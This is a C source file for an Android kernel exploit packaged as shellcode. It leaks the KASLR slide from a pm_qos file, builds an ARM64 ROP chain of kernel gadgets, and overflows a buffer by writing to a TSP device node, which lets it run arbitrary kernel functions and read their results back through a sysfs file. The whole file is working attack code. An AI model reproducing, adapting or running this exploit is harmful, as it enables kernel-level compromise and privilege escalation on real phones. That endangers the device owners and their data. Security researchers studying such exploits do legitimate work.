#include "symbols.h"
#include "debug.h"
#include "misc_defs.h"
#include "kexec.h"

/**
 * Shellcode entry point. We intentionally place it in a seperate section in
 * order to use a linker script to place it at the beginning of the binary.
 */
static int main(void* (*dlopen)(const char*, int), void* (*dlsym)(void*, const char*))
  __attribute__((section (".entry")));

/**
 * The KASLR slide value.
 */
static long kaslr_slide = 0;

static void* (*g_dlopen) (const char*, int)   = NULL;
static void* (*g_dlsym)  (void*, const char*) = NULL;

static void* g_libc   = NULL;
static void* g_liblog = NULL;

static unsigned int  (*sleep)                (unsigned int)                               = NULL;
static int           (*open)                 (const char*, int, ...)                      = NULL;
static long          (*read)                 (int, void*, unsigned long)                  = NULL;
static long          (*write)                (int, void*, unsigned long)                  = NULL;
static int*          (*__errno)              ()                                           = NULL;
static void*         (*malloc)               (long)                                       = NULL;
static void          (*free)                 (void*)                                      = NULL;
static int           (*__android_log_print)  (int, const char*, const char*, ...)         = NULL;
static int           (*pthread_create)       (pthread_t*, void*, void* (*)(void*), void*) = NULL;
static int           (*system)               (const char*)                                = NULL;
static int           (*close)                (int)                                        = NULL;
static unsigned long (*getline)              (char**, unsigned long*, void*)              = NULL;
static char*         (*strstr)               (const char*, const char*)                   = NULL;
static int           (*sscanf)               (const char*, const char*, ...)              = NULL;
static void*         (*fopen)                (const char*, const char*)                   = NULL;
static int           (*fclose)               (void*)                                      = NULL;
static unsigned long (*strtoul)              (const char*, char**, int)                   = NULL;

static int get_kernel_slide(long* slide);

static void* do_execute_in_kernel(void*);

static unsigned long execute_in_kernel(unsigned long function,
                                       unsigned long arg0, unsigned long arg1, unsigned long arg2, unsigned long arg3,
                                       unsigned long arg4, unsigned long arg5, unsigned long arg6);

static void crash();

int main(void* (*dlopen)(const char*, int), void* (*dlsym)(void*, const char*)) {

  //Resolving the wanted symbols
  g_dlopen = dlopen;
  g_dlsym = dlsym;

  g_libc = g_dlopen("libc.so", RTLD_NOW);
  g_liblog = g_dlopen("liblog.so", RTLD_NOW);

  sleep               = (unsigned int (*) (unsigned int))                    g_dlsym(g_libc,   "sleep");
  open                = (int (*) (const char*, int, ...))                    g_dlsym(g_libc,   "open");
  read                = (long (*) (int, void*, unsigned long))               g_dlsym(g_libc,   "read");
  write               = (long (*) (int, void*, unsigned long))               g_dlsym(g_libc,   "write");
  __errno             = (int* (*) ())                                        g_dlsym(g_libc,   "__errno");
  malloc              = (void* (*) (long))                                   g_dlsym(g_libc,   "malloc");
  free                = (void (*) (void*))                                   g_dlsym(g_libc,   "free");
  __android_log_print = (int (*)(int, const char*, const char*, ...))        g_dlsym(g_liblog, "__android_log_print");
  pthread_create      = (int (*)(pthread_t*, void*, void*(*)(void*), void*)) g_dlsym(g_libc,   "pthread_create");
  system              = (int (*)(const char*))                               g_dlsym(g_libc,   "system");
  close               = (int (*)(int))                                       g_dlsym(g_libc,   "close");
  getline             = (unsigned long (*)(char**, unsigned long*, void*))   g_dlsym(g_libc,   "getline");
  strstr              = (char* (*)(const char*, const char*))                g_dlsym(g_libc,   "strstr");
  sscanf              = (int (*)(const char*, const char*, ...))             g_dlsym(g_libc,   "sscanf");
  fopen               = (void* (*)(const char*, const char*))                g_dlsym(g_libc,   "fopen");
  fclose              = (int (*)(void*))                                     g_dlsym(g_libc,   "fclose");
  strtoul             = (unsigned long (*)(const char*, char**, int))        g_dlsym(g_libc,   "strtoul");

  LOG("Running!");

  //Getting the KASLR slide
  int res = get_kernel_slide(&kaslr_slide);
  if (res < 0) {
    LOG("Failed to get kernel slide! %d", res);
    crash();
  }
  LOG("Got kernel slide: 0x%lx", kaslr_slide);

  //Executing a short function in the kernel
  unsigned long value = KEXEC0(RET_ONE + kaslr_slide);

  LOG("Back from kernel!");
  while (1) {
    sleep(1);
  }
}

static void* do_execute_in_kernel(void* thread_arg) {
  struct args_structure* args = (struct args_structure*)thread_arg;

  //Preparing the buffer for the overflow
  unsigned long size = TSP_BUFFER_SIZE + ROP_BUFFER_SIZE*sizeof(unsigned long);
  unsigned long stack_idx = 0;
  char* buf = malloc(size);
  int i=0;
  for (i=0; i<size; i++)
    buf[i] = '\x00';

  //Fixing up addresses of the gadgets according to the KASLR slide
  void* b_self = (void*)(B_SELF + kaslr_slide);
  void* ldp_x19_to_x30_ret = (void*)(LDP_X19_to_X30_RET + kaslr_slide);
  void* ldp_x0_to_x7_blr_x16 = (void*)(LDP_X0_to_X7_BLR_X16 + kaslr_slide);
  void* blr_x7_pop_x19_x20_x29_x30_ret = (void*)(BLR_X7_POP_X29_X30_RET + kaslr_slide);
  void* ldp_x29_x30_offset_0x80_ret = (void*)(LDP_X29_X30_OFFSET_0x80_RET + kaslr_slide);
  void* str_x0_x19_ldp_x19_x20_x29_x30_ret = (void*)(STR_X0_X19_LDP_X19_X20_X29_X30_RET + kaslr_slide);
  void* uevent_seqnum = (void*)(UEVENT_SEQNUM + kaslr_slide);
  void* exec_func_addr = (void*)(args->exec_func);

  //Writing the ROP stack
  unsigned long addr_of_stack_fixup_gadget = (unsigned long)ldp_x29_x30_offset_0x80_ret;

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)ldp_x19_to_x30_ret;                 //X30

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)ldp_x0_to_x7_blr_x16;               //X30
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X19
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X20
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X21
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X22
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X23
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X24
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X25
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = 0;                                                 //X26
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)&addr_of_stack_fixup_gadget;        //X27
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg0;                                        //X0
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg1;                                        //X1
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg2;                                        //X2
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg3;                                        //X3
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg4;                                        //X4
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg5;                                        //X5
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = args->arg6;                                        //X6
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)exec_func_addr;                     //X7
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)blr_x7_pop_x19_x20_x29_x30_ret;     //X30

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)ldp_x19_to_x30_ret;                 //X30

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)str_x0_x19_ldp_x19_x20_x29_x30_ret; //X30
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)uevent_seqnum;                      //X19
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X20
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X21
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X22
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X23
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X24
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X25
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X26
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X27
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //(unused)

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)str_x0_x19_ldp_x19_x20_x29_x30_ret; //X30
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)&args->res;                         //X19
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X20

  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X29
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = (unsigned long)b_self;                             //X30
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X19
  ((unsigned long*)(buf + TSP_BUFFER_SIZE))[stack_idx++] = GARBAGE_VALUE;                                     //X20

  //Triggering the overflow!
  int fd = open(TSP_PATH, O_WRONLY);
  int res = write(fd, buf, size);
  LOG("Back from kernel? This shouldn't happen. %d", res);
  crash();

  return NULL;

}

static unsigned long execute_in_kernel(unsigned long function,
                                       unsigned long arg0, unsigned long arg1, unsigned long arg2, unsigned long arg3,
                                       unsigned long arg4, unsigned long arg5, unsigned long arg6) {
  pthread_t thread = 0;
  volatile struct args_structure* args = (struct args_structure*)malloc(sizeof(struct args_structure));
  args->exec_func = function;
  args->arg0 = arg0;
  args->arg1 = arg1;
  args->arg2 = arg2;
  args->arg3 = arg3;
  args->arg4 = arg4;
  args->arg5 = arg5;
  args->arg6 = arg6;
  args->res = MAGIC_RES_VALUE;
  pthread_create(&thread, NULL, do_execute_in_kernel, (void*)args);

  //Waiting for the canary to change
  while (args->res == MAGIC_RES_VALUE) {
    //busy loop!
  }

  //Reading the value from sysfs
  char* buf = malloc(SEQNUM_BUFFER_SIZE);
  int i;
  for (i=0; i<SEQNUM_BUFFER_SIZE; i++)
    buf[i] = '\0';

  int fd = open(UEVENT_SEQNUM_PATH, O_RDONLY);
  read(fd, buf, SEQNUM_BUFFER_SIZE);
  unsigned long result =  strtoul(buf, NULL, 10);
  free(buf);
  close(fd);

  return result;
}

static int get_kernel_slide(long* slide) {

  void* file = fopen(PM_QOS_PATH, "r");
  if (!file)
    return -1;

  char* line = NULL;
  unsigned long len = 0;
  long read = 0;
  while ((read = getline(&line, &len, file)) != -1) {
    if (strstr(line, "lpass")) {
      unsigned long lpass = 0;
      sscanf(line, "      %lx", &lpass);
      *slide = (long)(lpass & LPASS_MASK) - LPASS_OFFSET;
      return 0;
    }
  }
  return -1;
}

static void crash() {
  *((int*)0xffffffffffffffff) = 0x1337;
}
